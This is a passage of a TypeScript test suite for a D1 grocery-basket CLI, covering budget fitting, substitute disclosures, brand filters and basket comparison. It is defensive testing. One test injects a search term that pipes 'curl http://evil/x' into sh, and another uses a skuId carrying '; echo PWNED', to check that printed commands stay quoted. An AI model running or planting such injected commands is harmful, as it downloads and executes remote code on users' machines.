    expect(l?.inStock).toBe(3);
    const rendered = renderBasket(plan, { regionId: "v2.ABC" });
    expect(rendered).toContain("3 in its category");
    // The sweep read 3 products of a category D1 says holds 140. `d1
    // substitute` says so on this exact sentence; the basket must too.
    expect(rendered).toContain("only 3 of 140 in that category were searched");
  });

  test("a truly empty category says so, rather than counting nothing", async () => {
    const plan = await buildBasket(
      fakeClient({
        search: [wire("192", "PAN ARTESANAL INTEGRAL", { available: false, price: 4000 })],
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        sweep: [wire("x", "TODO AGOTADO", { available: false, price: 3000 })],
      }),
      ["pan"],
      10_000_000,
    );
    expect(plan.lines[0]?.inStock).toBe(0);
    // "nothing in its category" would be a universal over one page of a
    // category that may hold hundreds. It is hedged to what was searched.
    expect(renderBasket(plan, { regionId: "v2.ABC" })).toContain(
      "nothing in the part of its category that was searched is either",
    );
  });

  test("the ranker's order decides which replacement is used", async () => {
    // `buyable[0]` was unpinned: reversing it, or re-sorting by price, both left
    // the suite green because no fixture had two buyable candidates.
    const plan = await buildBasket(
      fakeClient({
        search: [wire("192", "PAN ARTESANAL INTEGRAL", { available: false, price: 4000 })],
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        sweep: [
          // Closest by name, and NOT the cheapest — so a price-sorted or
          // reversed pick would choose differently.
          wire("700", "PAN ARTESANAL INTEGRAL GRANDE", { price: 4100 }),
          wire("900", "GALLETA BARATA", { price: 1000 }),
        ],
      }),
      ["pan"],
      10_000_000,
    );
    expect(plan.lines[0]?.status).toBe("filled-by-substitute");
    expect(plan.lines[0]?.product?.skuId).toBe("700");
    expect(plan.lines[0]?.compared).toBe(2);
  });
});

describe("renderBasket defends itself against a hand-built plan", () => {
  test("a filled line with no product is not rendered as a row", () => {
    // `fillToBudget` already downgrades such a line, so this guard is
    // unreachable through the normal path — but `renderBasket` is exported and
    // takes a plan directly, which is exactly how these tests call it. Without
    // the guard the row renders with an empty name and a real price.
    const out = renderBasket(
      {
        budget: 1_000_000,
        lines: [line({ term: "arroz", price: 555_000, product: undefined })],
        total: 555_000,
        remaining: 445_000,
      },
      { regionId: "v2.ABC" },
    );
    expect(out).toContain("could go in the basket");
    expect(out).toContain("0 of 1 lines");
  });
});

describe("a budget must be the number that was typed", () => {
  test("one too large to represent exactly is refused", () => {
    // Past MAX_SAFE_INTEGER/100 the conversion to hundredths loses integer
    // precision, so the ceiling enforced is not the one asked for — silently
    // becoming a different plausible number is what this parser exists to stop.
    expect(parseBudget(90_071_992_547_409)).toBe(9_007_199_254_740_900);
    expect(() => parseBudget(90_071_992_547_410)).toThrow(/too large/);
    expect(() => parseBudget("999.999.999.999.999.999")).toThrow(/too large/);
    // A trillion pesos is still fine — the bound refuses nothing realistic.
    expect(parseBudget(1_000_000_000_000)).toBe(100_000_000_000_000);
  });
});

describe("a replacement is skipped when it cannot be bought", () => {
  test("and the PRICED runner-up is used instead", async () => {
    // `findSubstitutes` slices to `limit` before returning, so asking for one
    // and then skipping unpriced candidates skipped the only candidate there
    // was — the fix was inert and a buyable runner-up was reported as an empty
    // category.
    const plan = await buildBasket(
      fakeClient({
        search: [wire("192", "PAN ARTESANAL INTEGRAL", { available: false, price: 4000 })],
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        sweep: [
          // Ranks first, in stock, but D1 publishes no offer for it here.
          wire("500", "PAN INTEGRAL SIN OFERTA", { price: 0, unit: "Gr", value: "500" }),
          wire("738", "TOSTADA INTEGRAL", { price: 1950, unit: "Gr", value: "150" }),
        ],
      }),
      ["pan"],
      10_000_000,
    );
    expect(plan.lines[0]?.status).toBe("filled-by-substitute");
    expect(plan.lines[0]?.product?.skuId).toBe("738");
    expect(plan.total).toBe(195_000);
  });
});

describe("the footer names every mechanism actually in play", () => {
  const valued = line({
    term: "arroz",
    price: 555_000,
    product: product("1075", "ARROZ 2000 GRS", 555_000, { measure: "kg", amount: 2 }),
  });
  const packPriced = line({
    term: "cosa",
    price: 190_000,
    product: product("x", "COSA SIN PUM", 190_000),
    byPackPrice: true,
  });
  const swapped = line({
    term: "pan",
    price: 195_000,
    status: "filled-by-substitute",
    product: product("738", "TOSTADA", 195_000, { measure: "kg", amount: 0.15 }),
    replaces: product("192", "PAN ARTESANAL", 400_000, { available: false }),
    substituteSweep: true,
  });
  const foot = (...ls: BasketLine[]) => {
    const out = renderBasket(fillToBudget(ls, 10_000_000), { regionId: "v2.ABC" });
    return out.slice(
      out.lastIndexOf("Each line") === -1
        ? out.lastIndexOf("Every line")
        : out.lastIndexOf("Each line"),
    );
  };

  test("value only — no pack-price clause, no replacement clause", () => {
    const f = foot(valued);
    expect(f).not.toContain("pack price");
    expect(f).not.toContain("replacement");
  });

  test("a pack-price line adds its clause, and only then", () => {
    // Round 4 proved this clause had zero coverage in EITHER polarity, so it
    // could be deleted, inverted, or replaced with nonsense, all with a green
    // suite — while a code comment justified dropping another disclosure on the
    // grounds that "the footer covers the rest".
    expect(foot(packPriced)).toContain("by pack price where D1 publishes no size");
    expect(foot(valued)).not.toContain("by pack price");
  });

  test("a mixed basket names the replacement as an exception", () => {
    const f = foot(valued, swapped);
    expect(f).toContain("except a replacement");
  });

  test("an all-replacement basket does not call the exception a rule", () => {
    // "Each line is the best among the products fetched for its term … except a
    // replacement" is false for 100% of a basket where every line IS one.
    const f = foot(swapped);
    expect(f).toContain("Every line here is a replacement");
    expect(f).not.toContain("except a replacement");
  });
});

describe("an unanswered lookup outranks an affordability claim", () => {
  test("a mixed empty basket does not blame the budget", () => {
    // The prose and the exit code are two outputs of one invocation. Blaming
    // the budget while exiting 1 ("D1 could not be reached, a retry may help")
    // tells one reader to raise the budget and another to retry.
    const plan = fillToBudget(
      [
        line({ term: "arroz", price: 900_000 }),
        line({ term: "pan", status: "replacement-unknown", product: undefined }),
      ],
      10_000,
    );
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).not.toContain("Nothing fits this budget");
    expect(out).toContain("did not answer");
    expect(basketExit(plan.lines)).toBe(1);
  });

  test("a purely unaffordable basket still says so", () => {
    const plan = fillToBudget([line({ term: "arroz", price: 900_000 })], 10_000);
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("the budget was short");
    expect(out).not.toContain("D1 did not answer");
  });

  test("a mixed basket names BOTH reasons, rather than picking one", () => {
    // Priority-picking made the headline false for whichever lines the losing
    // condition described — "nothing could be checked" printed directly above a
    // line whose price was known and rejected.
    const plan = fillToBudget(
      [
        line({ term: "arroz", price: 900_000 }),
        line({ term: "pan", status: "replacement-unknown", product: undefined }),
      ],
      10_000,
    );
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("D1 did not answer");
    expect(out).toContain("the budget was short");
  });
});

describe("a substitute line counts only what could be bought", () => {
  test("candidates with no price are not part of 'best of N'", async () => {
    // `rankedCount` counts everything past the AVAILABILITY filter, but the
    // price filter rejects more — so the line said "best of 4 in its category"
    // for the only buyable one of four, which is this module's own stated
    // invariant broken on the one path that did not enforce it.
    const plan = await buildBasket(
      fakeClient({
        search: [wire("192", "PAN ARTESANAL INTEGRAL", { available: false, price: 4000 })],
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        sweep: [
          wire("500", "PAN ARTESANAL INTEGRAL BIS", { price: 0 }),
          wire("501", "PAN ARTESANAL SIN OFERTA", { price: 0 }),
          wire("738", "TOSTADA INTEGRAL", { price: 1950, unit: "Gr", value: "150" }),
        ],
      }),
      ["pan"],
      10_000_000,
    );
    expect(plan.lines[0]?.status).toBe("filled-by-substitute");
    expect(plan.lines[0]?.product?.skuId).toBe("738");
    // One buyable candidate — not three.
    expect(plan.lines[0]?.compared).toBe(1);
    expect(renderBasket(plan, { regionId: "v2.ABC" })).toContain("best of 1 in its category");
  });
});

describe("the summary bills what the body shows", () => {
  test("a hand-built plan cannot charge for a line it does not render", () => {
    const out = renderBasket(
      {
        budget: 1_000_000,
        lines: [line({ term: "arroz", price: 555_000, product: undefined })],
        total: 555_000,
        remaining: 445_000,
      },
      { regionId: "v2.ABC" },
    );
    expect(out).toContain("0 of 1 lines");
    // The count was fixed in an earlier round; the money was not.
    expect(out).not.toContain("$ 5.550");
    expect(out).toContain("$ 0 of $ 10.000");
  });
});

describe("a categorical claim is only as wide as the sweep behind it", () => {
  const term = [wire("192", "PAN ARTESANAL INTEGRAL", { available: false, price: 4000 })];

  test("a filled replacement discloses how partial the look was", async () => {
    // `scopeOf` printed "best of 2 in its category" with no denominator, while
    // an ordinary line printed "best of 20 compared, of 29 D1 matched". Same
    // command, two standards.
    const plan = await buildBasket(
      fakeClient({
        search: term,
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        sweep: [
          wire("738", "TOSTADA INTEGRAL", { price: 1950, unit: "Gr", value: "150" }),
          wire("739", "TOSTADA OTRA", { price: 2500, unit: "Gr", value: "150" }),
        ],
        sweepTotal: 140,
      }),
      ["pan"],
      10_000_000,
    );
    expect(plan.lines[0]?.status).toBe("filled-by-substitute");
    expect(plan.lines[0]?.categoryTotal).toBe(140);
    expect(renderBasket(plan, { regionId: "v2.ABC" })).toContain(
      "only 2 of 140 in that category were searched",
    );
  });

  test("a complete sweep claims no partiality it does not have", async () => {
    // When the page held the whole category there is nothing to disclose, and
    // adding the caveat anyway would be its own false statement.
    const plan = await buildBasket(
      fakeClient({
        search: term,
        sku: sourceSku("192", "PAN ARTESANAL INTEGRAL"),
        sweep: [wire("738", "TOSTADA INTEGRAL", { price: 1950, unit: "Gr", value: "150" })],
        sweepTotal: 1,
      }),
      ["pan"],
      10_000_000,
    );
    expect(renderBasket(plan, { regionId: "v2.ABC" })).not.toContain("were searched");
  });
});

describe("an over-budget replacement is still named", () => {
  test("its price is not attributed to the term the shopper typed", async () => {
    // The one path where a substitution was applied and then not shown. The
    // line read "huevos — would cost $ 24.900" for a price belonging to a
    // product the render never mentioned, so the shopper read a different,
    // larger product's price as the price of what they asked for.
    const plan = await buildBasket(
      fakeClient({
        search: [wire("16", "HUEVO AA X30", { available: false, price: 16_900 })],
        sku: sourceSku("16", "HUEVO AA X30"),
        sweep: [wire("36", "HUEVO AAA X36 BANDEJA", { price: 24_900 })],
        sweepTotal: 140,
      }),
      ["huevos"],
      // Deliberately below the replacement's price, so it is resolved and then
      // rejected — the exact shape a tight budget hits late in a list.
      1_000_000,
    );
    const l = plan.lines[0];
    expect(l?.status).toBe("over-budget");
    expect(l?.replaces?.skuId).toBe("16");

    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("HUEVO AAA X36 BANDEJA");
    expect(out).toContain("closest replacement");
    // And the sweep disclosure is not dropped on this branch either.
    expect(out).toContain("only 1 of 140 in that category were searched");
  });

  test("a plain over-budget line says nothing about replacements", () => {
    const plan = fillToBudget([line({ term: "caviar", price: 900_000 })], 10_000);
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("would cost");
    expect(out).not.toContain("replacement");
  });
});

describe("the pack-price disclosure does not overclaim about D1's data", () => {
  test("it blames incomparable measures, not missing sizes, when sizes exist", async () => {
    // "D1 publishes no size for any of these" is a claim about the DATA. If
    // sizes were published and only a comparable measure was missing, that
    // claim is contradicted by the very payload it describes.
    const plan = await buildBasket(
      fakeClient({
        // One kg product and one unit product, each the only one of its
        // measure, so no measure is dominant enough to compare within.
        search: [wire("a", "COSA POR KILO", { price: 5000, unit: "Gr", value: "500" })],
      }),
      ["cosa"],
      10_000_000,
    );
    // A single sized product IS comparable, so this must NOT be a pack-price pick.
    expect(plan.lines[0]?.byPackPrice).toBe(false);
    expect(renderBasket(plan, { regionId: "v2.ABC" })).not.toContain("chosen on pack price");
  });

  test("a genuinely sizeless set still says D1 published no size", async () => {
    const plan = await buildBasket(
      fakeClient({ search: [wire("a", "COSA SIN PUM", { price: 5000 })] }),
      ["cosa"],
      10_000_000,
    );
    expect(plan.lines[0]?.byPackPrice).toBe(true);
    expect(plan.lines[0]?.anySized).toBe(false);
    expect(renderBasket(plan, { regionId: "v2.ABC" })).toContain(
      "D1 publishes no size for any of these",
    );
  });
});

describe("an over-budget line says what else would have fitted [BRO-2086]", () => {
  test("chooseBest carries the runners-up it passed over", () => {
    const best = chooseBest([
      product("a", "ARROZ 1KG", 5_000, { measure: "kg", amount: 1 }),
      product("b", "ARROZ 500G", 3_000, { measure: "kg", amount: 0.5 }),
      product("c", "ARROZ 2KG", 12_000, { measure: "kg", amount: 2 }),
    ]);
    // Best value is the 1kg at $5/kg; the other two are the alternatives, and
    // their PACK prices are what a budget is spent in.
    expect(best?.product.skuId).toBe("a");
    expect([...(best?.alternatives ?? [])].sort((x, y) => x - y)).toEqual([3_000, 12_000]);
  });

  test("packPrices drops what cannot be bought, so no alternative is a phantom", () => {
    // Reached directly because no current caller can reach it: `chooseBest` and
    // `bestSubstitute` both pre-filter on `priced()` (price > 0), so a mutation
    // deleting this guard survived the entire suite. An unfalsifiable guard is
    // an unverified one, and the fix for that is a test, not a deletion.
    expect(
      packPrices([
        product("ok", "CON PRECIO", 4_000),
        product("zero", "SIN OFERTA", 0),
        product("also", "TAMBIÉN", 9_000),
      ]),
    ).toEqual([4_000, 9_000]);
  });

  test("an out-of-stock runner-up is never offered as an alternative", () => {
    const best = chooseBest([
      product("a", "ARROZ 1KG", 5_000, { measure: "kg", amount: 1 }),
      product("b", "ARROZ 500G", 3_000, { measure: "kg", amount: 0.5, available: false }),
      // A THIRD, in stock. Without it the assertion was `toEqual([])`, which a
      // permanently empty `alternatives` satisfies — deleting the whole feature
      // left this test green. Now it fails both when the sold-out one is wrongly
      // included AND when the population is empty.
      product("c", "ARROZ 3KG", 12_000, { measure: "kg", amount: 3 }),
    ]);
    // `chooseBest` filters to available+priced before ranking, so the sold-out
    // one is not in the set at all. Counting it would promise a fit that cannot
    // be bought — the "0 is not free" defect wearing an availability hat.
    expect(best?.product.skuId).toBe("c");
    expect(best?.alternatives).toEqual([5_000]);
  });

  test("fillToBudget counts only the alternatives that fit what is LEFT", () => {
    const plan = fillToBudget(
      [
        line({ term: "arroz", price: 6_000 }),
        // 4.000 of the 10.000 budget is left when this line is judged, so the
        // 3.000 alternative fits and the 5.000 one does not.
        line({ term: "aceite", price: 9_000, alternatives: [3_000, 5_000, 12_000] }),
      ],
      10_000,
    );
    expect(plan.lines[1]?.status).toBe("over-budget");
    expect(plan.lines[1]?.affordableAlternatives).toBe(1);
  });

  test("the count is ABSENT, not zero, when nothing else would have fitted", () => {
    const plan = fillToBudget(
      [line({ term: "caviar", price: 90_000, alternatives: [80_000] })],
      10_000,
    );
    // Absent rather than 0 so `--json` consumers cannot read a meaningless zero
    // on every filled line as "nothing else was available".
    expect(plan.lines[0]?.affordableAlternatives).toBeUndefined();
  });

  test("a fitting alternative is necessarily CHEAPER, so the wording is arithmetic", () => {
    // spent + price > budget >= spent + alt  =>  alt < price. The rendered word
    // "cheaper" is derived, not assumed — this pins the inequality at the exact
    // boundary, where an off-by-one in either comparison would show.
    //
    // Both surviving alternatives are strictly below the refused 9.001: the one
    // equal to the budget fits (the ceiling is inclusive) and is still cheaper,
    // which is the case that makes "cheaper" true rather than merely usually true.
    const plan = fillToBudget(
      [line({ term: "x", price: 9_001, alternatives: [8_999, 9_000, 9_001] })],
      9_000,
    );
    expect(plan.lines[0]?.status).toBe("over-budget");
    expect(plan.lines[0]?.affordableAlternatives).toBe(2);
  });

  test("the shopper is told, and pointed at the command that shows them", () => {
    const plan = fillToBudget(
      [line({ term: "aceite", price: 9_000, alternatives: [3_000] })],
      5_000,
    );
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("1 cheaper match for this term would fit");
    expect(out).toContain("d1 search 'aceite' --available --sort per-unit");
  });

  test("it pluralises, because a basket prints this next to real numbers", () => {
    const plan = fillToBudget(
      [line({ term: "aceite", price: 9_000, alternatives: [3_000, 2_000] })],
      5_000,
    );
    expect(renderBasket(plan, { regionId: "v2.ABC" })).toContain("2 cheaper matches");
  });

  test("nothing is said when nothing would have fitted", () => {
    const plan = fillToBudget(
      [line({ term: "caviar", price: 90_000, alternatives: [80_000] })],
      10_000,
    );
    expect(renderBasket(plan, { regionId: "v2.ABC" })).not.toContain("would fit");
  });

  test("the ticket's own scenario, end to end through buildBasket", async () => {
    // BRO-2086 as filed: the closest replacement does not fit, a cheaper one in
    // the same sweep would, and the line was dropped saying nothing about it.
    const plan = await buildBasket(
      fakeClient({
        search: [wire("16", "HUEVO AA X30", { available: false, price: 16_900 })],
        sku: sourceSku("16", "HUEVO AA X30"),
        sweep: [
          wire("36", "HUEVO AA X36 BANDEJA", { price: 24_900 }),
          wire("15", "HUEVOS CODORNIZ X15 PEQUE", { price: 4_000 }),
        ],
        sweepTotal: 140,
      }),
      ["huevos"],
      1_000_000,
    );
    const l = plan.lines[0];
    expect(l?.status).toBe("over-budget");
    // The CLOSEST match is still what was chosen — this fix reports, it does not
    // re-pick. Swapping in the cheaper one is the auto-substitution BRO-2076
    // forbids, and the whole point of option 1 is that it does not happen.
    expect(l?.product?.name).toBe("HUEVO AA X36 BANDEJA");
    expect(l?.affordableAlternatives).toBe(1);

    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("1 cheaper replacement of those searched would fit");
    expect(out).toContain("d1 substitute 16");
    // And it still sits inside the sweep's own caveat rather than claiming the
    // category entire.
    expect(out).toContain("only 2 of 140 in that category were searched");
  });
});

describe("the affordability claim agrees with the money actually left [BRO-2086]", () => {
  test("a line that spends AFTER the refusal cannot leave the claim stranded", () => {
    // The count was taken inside the loop, against the budget left at the moment
    // of refusal. Lines after it keep spending, so the basket printed
    //   "$ 1.000 left"  and one line below
    //   "1 cheaper match would fit"  about a $ 3.000 product.
    // A claim refuted by the evidence printed beside it is this codebase's own
    // named failure mode.
    const plan = fillToBudget(
      [
        line({ term: "arroz", price: 100_000 }),
        line({ term: "caviar", price: 950_000, alternatives: [300_000] }),
        line({ term: "leche", price: 800_000 }),
      ],
      1_000_000,
    );
    expect(plan.remaining).toBe(100_000);
    expect(plan.lines[1]?.status).toBe("over-budget");
    // 300.000 does not fit in the 100.000 finally left, so nothing is claimed.
    expect(plan.lines[1]?.affordableAlternatives).toBeUndefined();
    expect(renderBasket(plan, { regionId: "v2.ABC" })).not.toContain("would fit");
  });

  test("it is still reported when the money really is there at the end", () => {
    // The other polarity: without this, settling against `remaining` could be
    // mutated to a constant `undefined` and the test above would still pass.
    const plan = fillToBudget(
      [
        line({ term: "arroz", price: 100_000 }),
        line({ term: "caviar", price: 950_000, alternatives: [300_000] }),
      ],
      1_000_000,
    );
    expect(plan.remaining).toBe(900_000);
    expect(plan.lines[1]?.affordableAlternatives).toBe(1);
  });
});

describe("a printed command stays ONE command [BRO-2086]", () => {
  test("a hostile term cannot break out of its quoting", () => {
    // These are the first lines in present.ts to interpolate data into
    // something a reader — or an agent, since every command here has a --json
    // twin — may run. `sanitize` only strips control characters.
    const plan = fillToBudget(
      [
        line({
          term: 'x" ; curl http://evil/x | sh ; echo "',
          price: 9_000,
          alternatives: [1_000],
        }),
      ],
      5_000,
    );
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    expect(out).toContain("would fit");
    // Single-quoted, so the injected text is one argument rather than a second
    // command, and no unescaped double quote can close the string.
    expect(out).toContain("d1 search 'x\" ; curl http://evil/x | sh ; echo \"'");
    expect(out).not.toContain('d1 search "x"');
  });

  test("an apostrophe is escaped rather than left to close the quote", () => {
    const plan = fillToBudget(
      [line({ term: "l'aceite", price: 9_000, alternatives: [1_000] })],
      5_000,
    );
    // POSIX sh has exactly one escape for a single quote, and this is it.
    expect(renderBasket(plan, { regionId: "v2.ABC" })).toContain("d1 search 'l'\\''aceite'");
  });

  test("a non-numeric skuId drops the command rather than printing a broken one", () => {
    // Hand-built, deliberately. `assertSkuId` in catalog.ts refuses a
    // non-numeric id at the SKU lookup, so `buildBasket` can never carry one
    // this far — the line comes back `replacement-unknown` instead. The guard
    // is therefore defence in depth over an EXPORTED type that permits what the
    // code does not, exactly like `packPrices`. Reached directly so it is
    // falsifiable rather than merely reassuring.
    const hostile = product("16; echo PWNED", "HUEVO AA X30", 16_900);
    const plan = fillToBudget(
      [
        line({
          term: "huevos",
          price: 2_490_000,
          replaces: hostile,
          substituteSweep: true,
          alternatives: [400_000],
        }),
      ],
      1_000_000,
    );
    const out = renderBasket(plan, { regionId: "v2.ABC" });
    // The count still prints — the disclosure is not the unsafe part.
    expect(out).toContain("cheaper replacement of those searched would fit");
    // The command does not. `catalog.ts` already refuses to put an unvalidated
    // id into an `fq` filter; a printed command is another grammar.
    expect(out).not.toContain("d1 substitute");
    expect(out).not.toContain("PWNED");
  });

  test("the suggested search shows the SAME population the count came from", () => {
    // The count is of available, priced products; a bare `d1 search` lists the
    // rest too, so the shopper would be handed a differently-populated list.
    const plan = fillToBudget(
      [line({ term: "leche", price: 9_000, alternatives: [1_000] })],
      5_000,
    );
    expect(renderBasket(plan, { regionId: "v2.ABC" })).toContain("--available --sort per-unit");
  });
});

describe("a downgraded line carries no trace of prices it cannot offer [BRO-2086]", () => {
  test("nothing-in-stock drops its alternatives", () => {
    const plan = fillToBudget(
      [line({ term: "arroz", price: undefined, alternatives: [1_000, 2_000] })],
      1_000_000,
    );
    expect(plan.lines[0]?.status).toBe("nothing-in-stock");
    expect(plan.lines[0]?.alternatives).toBeUndefined();
  });
});

describe("an alternative must be a real price [BRO-2086]", () => {
  test("zero, negative and infinite prices are not 'cheaper matches that fit'", () => {
    // `packPrices` blocks these today, but `fillToBudget` is exported and
    // `alternatives` is public — the same "the exported type permits a caller
    // the code does not" reasoning that gated the skuId. A price of 0 is not
    // free, re-entered from a third direction.
    const plan = fillToBudget(
      [
        line({
          term: "arroz",
          // ABOVE the budget, or the line simply fills and the branch under
          // test is never reached — which is how the first draft of this test
          // passed while asserting nothing.
          price: 1_100_000,
          alternatives: [0, -500, Number.NEGATIVE_INFINITY, Number.NaN],
        }),
      ],
      1_000_000,
    );
    expect(plan.lines[0]?.status).toBe("over-budget");
    expect(plan.lines[0]?.affordableAlternatives).toBeUndefined();
  });

  test("a real price alongside the junk is still counted", () => {
    // The opposite polarity, so the filter cannot be mutated to a constant false.
    const plan = fillToBudget(
      [line({ term: "arroz", price: 1_100_000, alternatives: [0, 400_000, Number.NaN] })],
      1_000_000,
    );
    expect(plan.lines[0]?.affordableAlternatives).toBe(1);
  });
});

describe("normalizeBrand [BRO-2079]", () => {
  test("case and outer whitespace are noise; inner punctuation is not", () => {
    expect(normalizeBrand("Latti")).toBe("LATTI");
    expect(normalizeBrand("  latti  ")).toBe("LATTI");
    expect(normalizeBrand("santa   maria")).toBe("SANTA MARIA");
    // NOT stripped: two different brands could differ only by a hyphen or dot,
    // and collapsing them would silently price the wrong one.
    expect(normalizeBrand("d-1")).toBe("D-1");
  });

  test("a blank is undefined, not a filter matching blank-branded products", () => {
    // `--brand ""` reaching the filter as `""` would match exactly the products
    // whose brand D1 left empty — a real subset, and never what was asked for.
    expect(normalizeBrand("")).toBeUndefined();
    expect(normalizeBrand("   ")).toBeUndefined();
    expect(normalizeBrand(undefined)).toBeUndefined();
  });
});

describe("chooseBest with a brand constraint [BRO-2079]", () => {
  test("it picks the best value WITHIN the brand, not the best value overall", () => {
    const pick = chooseBest(
      [
        product("cheap", "ARROZ OTRO 1KG", 3_000, { measure: "kg", amount: 1, brand: "OTRA" }),
        product("want", "ARROZ LATTI 1KG", 5_000, { measure: "kg", amount: 1, brand: "LATTI" }),
      ],
      "LATTI",
    );
    expect(pick?.product.skuId).toBe("want");
    // And the excluded product is not counted as something this line weighed.
    expect(pick?.compared).toBe(1);
  });

  test("the brand filter runs BEFORE the measure census", () => {
    // Two sold-out-of-brand bottles measured in `unit` would otherwise make
    // `unit` the dominant measure for a set whose only real contest is between
    // the two LATTI litres — the same insertion-order defect the measure
    // tie-break exists for, entered through the brand door.
    const pick = chooseBest(
      [
        product("b1", "BOTELLA A", 100_000, { measure: "unit", amount: 1, brand: "OTRA" }),
        product("b2", "BOTELLA B", 100_000, { measure: "unit", amount: 1, brand: "OTRA" }),
        product("oil3", "ACEITE LATTI 3000 ML", 2_050_000, {
          measure: "L",
          amount: 3,
          brand: "LATTI",
        }),
        product("oil9", "ACEITE LATTI 900 ML", 695_000, {
          measure: "L",
          amount: 0.9,
          brand: "LATTI",
        }),
      ],
      "LATTI",
    );
    expect(pick?.product.skuId).toBe("oil3");
    expect(pick?.byPackPrice).toBe(false);
  });

  test("case does not have to match what D1 typed", () => {
    const pick = chooseBest(
      [product("a", "X", 1_000, { measure: "kg", amount: 1, brand: "LATTI" })],
      "latti",
    );
    expect(pick?.product.skuId).toBe("a");
  });

  test("no product of the brand yields undefined, not the next best thing", () => {
    expect(
      chooseBest([product("a", "X", 1_000, { measure: "kg", amount: 1, brand: "OTRA" })], "LATTI"),
    ).toBeUndefined();
  });

  test("without a brand it behaves exactly as before", () => {
    const products = [
      product("a", "ARROZ 1KG", 5_000, { measure: "kg", amount: 1, brand: "OTRA" }),
      product("b", "ARROZ 2KG", 8_000, { measure: "kg", amount: 2, brand: "LATTI" }),
    ];
    expect(chooseBest(products)?.product.skuId).toBe("b");
    expect(chooseBest(products, undefined)?.product.skuId).toBe("b");
    expect(chooseBest(products, "  ")?.product.skuId).toBe("b");
  });
});

describe("compareBaskets [BRO-2079]", () => {
  const twoTerms = () =>
    fakeClient({
      search: [
        wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" }),
        wire("2", "ARROZ LATTI", { price: 5_000, brand: "LATTI" }),
      ],
    });

  test("the delta is over terms BOTH filled — never a total-minus-total", async () => {
    // THE defect this feature exists to avoid. `arroz` fills in both baskets;
    // `caviar` fills only in the base one, because nothing of the brand matches
    // and the category sweep finds nothing either. Differencing the two plan
    // totals would report caviar's whole price as a saving, and the branded
    // basket would look dramatically cheaper for not having bought it.
    const client = fakeClient({
      search: [
        wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" }),
        wire("2", "ARROZ LATTI", { price: 5_000, brand: "LATTI" }),
      ],
      sku: sourceSku("1", "ARROZ BARATO"),
      sweep: [],
    });
    const c = await compareBaskets(client, ["arroz"], 100_000_000, { brand: "LATTI" });
    expect(c.comparable.terms).toBe(1);
    expect(c.comparable.baseTotal).toBe(300_000);
    expect(c.comparable.altTotal).toBe(500_000);
    expect(c.comparable.delta).toBe(200_000);
  });

  test("a term only one basket could fill is NAMED, not netted", async () => {
    const client = fakeClient({
      search: [wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" })],
      sku: sourceSku("1", "ARROZ BARATO"),
      sweep: [],
    });
    const c = await compareBaskets(client, ["arroz"], 100_000_000, { brand: "LATTI" });
    expect(c.onlyBase.map((m) => m.term)).toEqual(["arroz"]);
    expect(c.onlyAlt).toEqual([]);
    // Nothing shared means nothing to compare, and the totals say so by being
    // zero over zero terms rather than by reporting a saving.
    expect(c.comparable.terms).toBe(0);
    expect(c.comparable.delta).toBe(0);
  });

  test("a brand that matches nothing anywhere offers the brands that DID appear", async () => {
    // An empty branded basket is the same output for a typo and for a brand D1
    // genuinely does not carry. The hint separates them.
    const client = fakeClient({
      search: [wire("1", "ARROZ BARATO", { price: 3_000, brand: "MARCA REAL" })],
      sku: sourceSku("1", "ARROZ BARATO"),
      sweep: [],
    });
    const c = await compareBaskets(client, ["arroz"], 100_000_000, { brand: "TYPOO" });
    expect(c.brandsSeen).toEqual(["MARCA REAL"]);
  });

  test("no hint is offered when the brand DID fill something", async () => {
    const c = await compareBaskets(twoTerms(), ["arroz"], 100_000_000, { brand: "LATTI" });
    expect(c.brandsSeen).toBeUndefined();
  });

  test("both baskets are fit to the SAME budget", async () => {
    // Or the comparison is between one basket a shopper could buy and one they
    // could not, which is not a comparison.
    const c = await compareBaskets(twoTerms(), ["arroz"], 400_000, { brand: "LATTI" });
    expect(c.base.budget).toBe(400_000);
    expect(c.alt.budget).toBe(400_000);
    // Base fits its 3.000 pick; the 5.000 LATTI does not fit 4.000.
    expect(c.base.lines[0]?.status).toBe("filled");
    expect(c.alt.lines[0]?.status).toBe("over-budget");
    expect(c.comparable.terms).toBe(0);
  });

  test("a blank brand is a usage error, not a filter that quietly matches nothing", async () => {
    await expect(compareBaskets(twoTerms(), ["arroz"], 100_000, { brand: "   " })).rejects.toThrow(
      UsageError,
    );
  });

  test("the branded basket reaches the category sweep when the page has none", async () => {
    // BRO-2079's stated design: substitution with a BRAND constraint instead of
    // a stock one, reusing `findSubstitutes` rather than growing a second
    // ranker. The page holds no LATTI; the sweep does.
    const client = fakeClient({
      search: [wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" })],
      sku: sourceSku("1", "ARROZ BARATO"),
      sweep: [wire("9", "ARROZ LATTI PREMIUM", { price: 7_000, brand: "LATTI" })],
      sweepTotal: 140,
    });
    const c = await compareBaskets(client, ["arroz"], 100_000_000, { brand: "LATTI" });
    const line = c.alt.lines[0];
    expect(line?.status).toBe("filled-by-substitute");
    expect(line?.product?.name).toBe("ARROZ LATTI PREMIUM");
    expect(line?.replaces?.skuId).toBe("1");
  });

  test("a sweep with no product of the brand is `no-brand-match`, not out of stock", async () => {
    // "D1 has none of this brand" and "D1 has none of this in stock" are
    // different facts, and only one of them is about the shelf.
    const client = fakeClient({
      search: [wire("1", "ARROZ BARATO", { price: 3_000, brand: "OTRA" })],
      sku: sourceSku("1", "ARROZ BARATO"),
      sweep: [wire("9", "ARROZ OTRA MAS", { price: 7_000, brand: "TERCERA" })],
      sweepTotal: 140,
    });
    const c = await compareBaskets(client, ["arroz"], 100_000_000, { brand: "LATTI" });
    expect(c.alt.lines[0]?.status).toBe("no-brand-match");
